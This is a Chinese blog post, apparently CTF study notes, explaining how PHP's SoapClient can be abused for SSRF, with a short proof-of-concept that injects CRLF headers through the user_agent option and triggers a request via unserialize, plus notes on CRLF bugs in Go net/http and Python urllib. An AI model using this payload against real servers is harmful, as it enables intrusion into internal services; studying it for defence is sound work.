<p>PHP中的SoapClient类是用来创建soap数据报文，与wsdl接口进行交互的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> __construct(?<span class="keyword">string</span> <span class="variable">$wsdl</span>, <span class="keyword">array</span> <span class="variable">$options</span> = [])</span><br><span class="line"><span class="keyword">public</span> __call(<span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$args</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
<p>类的构造方法接受两个可选参数—<br>第一个参数$wsdl用来指明是否为wsdl模式，在wsdl模式的情况下，$options参数是可选的，也就是说可以没有；<br>但在非wsdl模式下，就必须要设置location和uri选项，其中location是我们要将请求发送到的SOAP服务器的URL，也就是目标URL</p>
<p>在SoapClient类中，还有一个魔术方法，**__call()**方法，当触发这个方法后，它就会向location中的目标URL发送一个soap请求<br>参数$options里选项user_agent，用这个可以控制HTTP数据包中头部User-Agent的值</p>
<p>利用SoapClient进行SSRF攻击内网，然后配合CRLF构造出POST请求可以拓展我们的攻击面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://47.101.57.72:4000/&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;WHOAMI\r\nSet-Cookie: PHPSESSID=whoami&quot;</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;a();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="2025-4-6补充-关于CRLF"><a href="#2025-4-6补充-关于CRLF" class="headerlink" title="2025/4/6补充-关于CRLF"></a>2025/4/6补充-关于CRLF</h5><p>因为这个漏洞过于简单，应用场景也不是很复杂，就是http请求或者响应生成时没过滤回车符(CR，ASCII 13，\r，%0d) 和换行符(LF，ASCII 10，\n，%0a)，很多web语言现在都没有这个漏洞了,网上也没什么文章，所以就不值得我在写一篇文章记录了，想到之前打ctf有遇到过crlf就写在这里了。</p>
<p>CRLF分为两种一种是构造http响应包的CRLF，可以导致的反射xss,一开始我还很兴奋以为发现新的xss技巧那，但是这个目前只有那些转载面经里有提到，我用php5.2都没复现成功,太鸡肋了，实战中几乎不可能遇到。</p>
<p>一种就是构造http请求的CRLF，包括上文说到的php SoapClient，还有：<br>net/http &lt; 1.11 CRLF <code>https://github.com/golang/go/issues/30794</code><br>Python urllib CRLF 注入漏洞（CVE-2019-9740）[Python 2&lt;2.7.16,Python 3&lt;3.7.2]</p>
<p>这两个都是2019年的CRLF,请求包crlf漏洞的作用就是自定义数据包，然后打打redis什么的，先这样吧，也是解决了当时一直搞不明白的一个问题点，ctf里偏题太多了</p>

        </div>

        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/11/02/sql/MYSQL%E8%AF%AD%E6%B3%95/">MYSQL语法</a>
            
            
            <a class="next" rel="next" href="/2022/09/10/php/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">php代码执行</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>